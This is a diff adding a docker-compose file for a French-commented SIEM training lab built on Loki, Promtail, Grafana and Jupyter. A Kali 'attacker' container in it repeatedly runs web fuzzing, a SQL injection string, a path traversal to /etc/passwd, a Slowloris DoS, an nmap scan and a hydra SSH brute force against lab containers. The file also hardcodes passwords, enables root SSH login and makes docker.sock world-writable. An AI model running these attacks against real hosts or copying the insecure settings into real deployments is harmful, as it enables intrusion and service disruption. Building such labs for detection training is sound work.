@@ -1,0 +1,148 @@
+services:
+  # --- INFRASTRUCTURE SIEM (PLG) ---
+  loki:
+    image: grafana/loki:3.0.0
+    container_name: siem_loki
+    ports: ["3100:3100"]
+    volumes:
+      - ./config/loki-config.yaml:/etc/loki/local-config.yaml
+    command: -config.file=/etc/loki/local-config.yaml
+    networks: [siem-net]
+
+  promtail:
+    image: grafana/promtail:3.0.0
+    container_name: siem_promtail
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock:ro
+      - ./config/promtail-config.yaml:/etc/promtail/config.yml
+    command: -config.file=/etc/promtail/config.yml
+    networks: [siem-net]
+    depends_on: [loki]
+
+  grafana:
+    image: grafana/grafana:latest
+    container_name: siem_grafana
+    ports: ["3000:3000"]
+    environment:
+      - GF_SECURITY_ADMIN_PASSWORD=admin
+    networks: [siem-net]
+    depends_on: [loki]
+
+  # --- POSTE ANALYSTE (JUPYTER) ---
+  jupyter:
+    image: jupyter/scipy-notebook:latest
+    container_name: siem_analyst
+    ports: ["8888:8888"]
+    environment:
+      - JUPYTER_TOKEN=securetoken123
+    # --- CORRECTION PERMISSION DENIED ICI ---
+    user: root 
+    # ----------------------------------------
+    volumes:
+      - ./jupyter:/home/jovyan/work
+      - shared_data:/home/jovyan/work/evidence
+      - /var/run/docker.sock:/var/run/docker.sock
+    networks: [siem-net]
+    command: >
+      bash -c "chmod 666 /var/run/docker.sock && 
+      start-notebook.sh --NotebookApp.token='securetoken123'"
+
+  # --- CIBLES & ATTAQUANTS ---
+
+  # L'ATTAQUANT (Version Complète Fusionnée)
+  attacker:
+    image: kalilinux/kali-rolling
+    container_name: attacker_bot
+    cap_add: [NET_ADMIN]
+    command: >
+      bash -c "
+      echo '--- [INIT] INSTALLATION ---';
+      apt-get update && apt-get install -y hydra curl nmap slowhttptest &&
+      
+      echo '--- [INIT] WORDLIST ---';
+      rm -f /tmp/passlist.txt &&
+      for i in {1..1000}; do echo pass_wrong_$$i >> /tmp/passlist.txt; done &&
+      
+      echo '--- STARTING ATTACK LOOP ---';
+      while true; do
+        # PHASE 1 : BRUIT WEB (Fuzzing 404) -> Indispensable pour votre courbe Grafana 'Web Security'
+        echo '[PHASE 1] Web Fuzzing (404)...';
+        for i in {1..30}; do
+          curl -s -o /dev/null http://web_server/admin_hidden_$$i.php &
+        done;
+
+        # PHASE 2 : INJECTIONS (SQLi & Traversal) -> Pour le Notebook Mission 1
+        echo '[PHASE 2] Web Exploits...';
+        for i in {1..10}; do
+          # SQL Injection
+          curl -s 'http://web_server/login?user=admin&pass=%27%20OR%201%3D1%20--' > /dev/null &
+          # Path Traversal
+          curl -s 'http://web_server/../../etc/passwd' > /dev/null &
+        done;
+
+        # PHASE 3 : DOS (Slowloris) -> Pour le Notebook Mission 2 (PCAP)
+        echo '[PHASE 3] Slowloris DoS...';
+        slowhttptest -c 50 -H -g -o /dev/null -i 10 -r 200 -t GET -u http://web_server/ -x 24 -p 3 -l 15 &
+
+        # PHASE 4 : SCAN & RECONNAISSANCE -> Pour le Panneau Grafana 'Scanner'
+        echo '[PHASE 4] Nmap Scan...';
+        curl -s -A 'Mozilla/5.0 (compatible; Nmap Scripting Engine)' http://web_server/scan_check;
+        nmap -F web_server > /dev/null;
+
+        # PHASE 5 : BRUTEFORCE SSH -> Pour le Panneau Grafana 'SSH'
+        echo '[PHASE 5] SSH Bruteforce...';
+        # On cible 'victim_server' qui est sur le même réseau frontend-net
+        hydra -l root -P /tmp/passlist.txt -t 4 victim_server ssh;
+
+        echo 'Pause...';
+        sleep 5;
+      done"
+    networks: 
+      - frontend-net # Il ne voit que la DMZ
+    depends_on:
+      - web_victim
+      - victim_server
+
+  web_victim:
+    image: nginx:alpine
+    container_name: web_server
+    cap_add: [NET_ADMIN] # Autorise iptables et tcpdump
+    volumes:
+      - ./nginx.conf:/etc/nginx/nginx.conf:ro
+      - shared_data:/tmp/evidence # Pour déposer les fichiers PCAP
+    command: > 
+      sh -c "apk update && apk add tcpdump iptables && nginx -g 'daemon off;'"
+    networks:
+      - frontend-net
+      - backend-net # Fait le pont vers la BDD
+      - siem-net    # Pour envoyer les logs
+
+  db_victim:
+    image: postgres:alpine
+    container_name: db_server
+    environment:
+      POSTGRES_PASSWORD: secretpassword
+    networks:
+      - backend-net # Isolé d'internet (attacker)
+
+  victim_server: # Serveur SSH
+    image: alpine:latest
+    container_name: victim_server
+    cap_add: [NET_ADMIN]
+    command: >
+      sh -c "apk add --no-cache openssh iptables tcpdump &&
+      ssh-keygen -A &&
+      sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config &&
+      echo 'root:monmotdepassecomplex' | chpasswd &&
+      /usr/sbin/sshd -D -e"
+    networks:
+      - frontend-net
+      - siem-net
+
+networks:
+  siem-net: # Réseau de gestion
+  frontend-net: # Zone Publique (DMZ)
+  backend-net: # Zone Privée (Interne)
+
+volumes:
+  shared_data: # Echange de preuves (PCAP)
